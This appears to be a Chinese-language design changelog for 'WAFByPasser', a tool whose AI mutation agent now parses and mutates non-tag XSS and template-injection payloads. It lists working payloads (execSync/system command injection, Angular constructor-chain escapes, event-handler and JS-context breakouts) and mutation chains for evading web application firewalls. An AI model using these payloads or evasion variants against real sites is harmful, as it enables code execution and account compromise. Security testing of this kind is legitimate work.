# 非标签型 XSS 支持文档

## 概述

本次更新为 WAFByPasser 的语义迭代 Agent 添加了对**非标签型 XSS payload** 的支持，解决了之前只能处理传统 HTML 标签型 XSS 的限制。

## 问题背景

在之前的实现中，XSS 解析器只能识别包含 HTML 标签（如 `<script>`, `<img>` 等）的 XSS payload。当尝试迭代以下类型的 payload 时，会报错"无法可靠识别 XSS 标签结构"：

1. **模板注入**：`<%= global.process.mainModule.require('child_process').execSync('id') %>`
2. **模板引擎**：`{{_c.constructor('alert(document.domain)')()}}`
3. **JS 模板字面量**：`${alert(document.domain)}`
4. **属性注入**：`" onload="alert(document.domain)`
5. **纯 JS 上下文**：`'-alert(document.domain)-'`

## 解决方案

### 1. 扩展解析器 (parser.py)

在 `backend/src/app/semantic_agent/parts/parser.py` 中添加了 `_try_parse_non_tag_xss()` 函数，支持以下类型：

#### 支持的 XSS 类型

| 类型 | 识别特征 | 示例 | 置信度 |
|------|---------|------|--------|
| ERB/JSP 模板注入 | `<%=` 或 `<%` 开头 | `<%= system('id') %>` | 0.9 |
| 模板引擎（Angular/Vue） | `{{` 开头 | `{{constructor.constructor('alert(1)')()}}` | 0.9 |
| JS 模板字面量 | `${` 开头 | `${alert(document.domain)}` | 0.9 |
| 属性注入 | 引号 + 事件处理器 | `" onload="alert(1)` | 0.85 |
| 纯 JS 上下文 | 引号 + JS 函数调用 | `'-alert(1)-'` | 0.8 |

#### 解析结果部件

非标签型 XSS 的部件结构与传统标签型不同：

```python
# 模板注入示例：<%= system('id') %>
parts = [
    {"part_type": "context_prefix", "raw": "<%="},        # 模板起始标记
    {"part_type": "javascript_expression", "raw": "..."},  # 执行表达式
    {"part_type": "closing_structure", "raw": "%>"}        # 模板结束标记
]

# 模板引擎示例：{{constructor.constructor('alert(1)')()}}
parts = [
    {"part_type": "context_prefix", "raw": "{{"},         # 双花括号起始
    {"part_type": "javascript_expression", "raw": "..."},  # 构造器链表达式
    {"part_type": "closing_structure", "raw": "}}"}        # 双花括号结束
]
```

### 2. 更新变异技术文档 (xss_mutation.md)

在 `backend/src/app/semantic_agent/skill/xss_mutation.md` 中添加了针对非标签型 XSS 的变异技术：

#### 新增变异技术

- **技术 10：模板注入表达式变换**
  - 适用于 ERB/JSP 模板注入
  - 示例：`system('id')` → `` `id` `` → `exec('id')` → `IO.popen('id').read`

- **技术 11：模板引擎构造器链变换**
  - 适用于 Angular/Vue 等模板引擎
  - 示例：`constructor.constructor(...)` → `_c.constructor(...)` → `[].constructor.constructor(...)`

- **技术 12：JS 模板字面量表达式变换**
  - 适用于 JavaScript 模板字面量
  - 示例：`alert(1)` → `eval('alert(1)')` → `Function('alert(1)')()`

- **技术 13：属性注入事件处理器变换**
  - 适用于属性注入场景
  - 示例：`" onload="alert(1)` → `" onerror="alert(1)` → `' onload='alert(1)`

- **技术 14：纯 JS 上下文函数变换**
  - 适用于纯 JavaScript 上下文注入
  - 示例：`'-alert(1)-'` → `'+alert(1)+'` → `'-eval("alert(1)")-'`

### 3. 更新 Agent 提示文档 (semantic_mutation_agent.md)

在 `backend/src/app/semantic_agent/prompt/semantic_mutation_agent.md` 中：

- 添加了 XSS 攻击类型识别表，明确区分传统标签型和非标签型
- 更新了 XSS 部件类型详解，分为两类：传统 HTML 标签型和非标签型
- 新增了非标签型 XSS 方向族，包括：
  - `part:template-expr-rewrite` — 模板表达式重写
  - `part:constructor-chain-rewrite` — 构造器链重写
  - `part:function-swap` — 函数替换
  - `part:operator-wrap` — 运算符包装
  - `part:indirect-call` — 间接调用
  - `part:event-attr-injection` — 事件属性注入变换

### 4. 关键设计原则

#### 攻击类别保持原则

变异必须保持原始攻击类别，禁止跨类型转换：

- ✅ 模板注入类（`<%`）→ 只改表达式，保留模板标记
- ✅ 模板引擎类（`{{`）→ 只改构造器链/表达式，保留双花括号
- ✅ JS 模板字面量类（`${`）→ 只改 JS 表达式，保留 `${}`
- ❌ 不要把 `{{...}}` 改成 `<script>`
- ❌ 不要把 `${...}` 改成 `<img>`

## 测试结果

所有 6 种非标签型 XSS payload 均成功解析：

| Payload | 状态 | 置信度 | 部件数 |
|---------|------|--------|--------|
| `<%= global.process...execSync('id') %>` | ✅ supported | 0.9 | 3 |
| `{{_c.constructor('alert...')()}}` | ✅ supported | 0.9 | 3 |
| `{{constructor.constructor('alert...')()}}` | ✅ supported | 0.9 | 3 |
| `${alert(document.domain)}` | ✅ supported | 0.9 | 3 |
| `" onload="alert(document.domain)` | ✅ supported | 0.85 | 3 |
| `'-alert(document.domain)-'` | ✅ supported | 0.8 | 3 |

## 使用示例

现在可以对这些非标签型 XSS payload 进行语义迭代了：

```python
# 模板注入变异示例
原始: <%= system('id') %>
变异: <%= `id` %>
变异: <%= exec('id') %>
变异: <%= IO.popen('id').read %>

# 模板引擎变异示例
原始: {{constructor.constructor('alert(1)')()}}
变异: {{_c.constructor('alert(1)')()}}
变异: {{[].constructor.constructor('alert(1)')()}}
变异: {{(1).constructor.constructor('alert(1)')()}}

# JS 模板字面量变异示例
原始: ${alert(document.domain)}
变异: ${prompt(document.domain)}
变异: ${eval('alert(document.domain)')}
变异: ${Function('alert(document.domain)')()}
```

## 文件修改清单

1. **backend/src/app/semantic_agent/parts/parser.py**
   - 新增 `_try_parse_non_tag_xss()` 函数
   - 修改 `_parse_xss()` 函数，优先尝试非标签型解析

2. **backend/src/app/semantic_agent/skill/xss_mutation.md**
   - 新增 XSS 攻击类型识别表
   - 新增技术 10-14：非标签型 XSS 变异技术
   - 更新变异原则检查清单

3. **backend/src/app/semantic_agent/prompt/semantic_mutation_agent.md**
   - 更新 XSS 部件类型详解，分为传统型和非标签型
   - 新增非标签型 XSS 方向族
   - 添加 XSS 攻击类别保持原则

## 向后兼容性

所有修改完全向后兼容，传统 HTML 标签型 XSS 仍然正常工作。解析器会先尝试非标签型匹配，如果失败则回退到原有的标签型解析逻辑。

## 未来改进

1. 优化重组逻辑，减少空格差异
2. 添加更多模板引擎类型支持（如 Jinja2、Thymeleaf）
3. 支持混合型 XSS（既有标签又有模板）
4. 添加更多语言的模板注入（如 Python、Java、Go）

## 相关问题

- GitHub Issue: 用户报告"无法可靠识别 XSS 标签结构"错误
- 相关文档：`docs/XSS_Enhancement_Summary.md`
